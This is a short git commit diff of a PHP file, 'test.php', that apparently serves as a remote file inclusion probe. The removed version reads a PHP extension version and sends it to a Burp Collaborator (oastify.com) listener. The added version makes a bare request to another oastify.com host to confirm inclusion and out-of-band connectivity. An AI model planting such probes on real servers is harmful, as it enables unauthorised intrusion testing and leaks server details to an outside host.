94edc3fbd7c546374865f22b16faf5521b774ef7
tanmaypundir <78787975+tanmaypundir@users.noreply.github.com>
2026-01-18 18:21:48 +0530

    Update test.php

--- test.php
+++ test.php
@@ -1,10 +1,4 @@
 <?php
-// 1. Get the version
-$version = phpversion('sysvmsg');
-
-// 2. Set your Burp Collaborator URL
-$collaborator = "https://xno0m19db2a75onoyhp4utqoxf36r0fp.oastify.com";
-
-// 3. Send the data to your listener
-file_get_contents($collaborator . "?version=" . urlencode($version));
+// Simple hit to verify RFI and Out-of-Band (OOB) connectivity
+file_get_contents("http://rojunva7cwb16ioizbqyvnriy940svgk.oastify.com");
 ?>
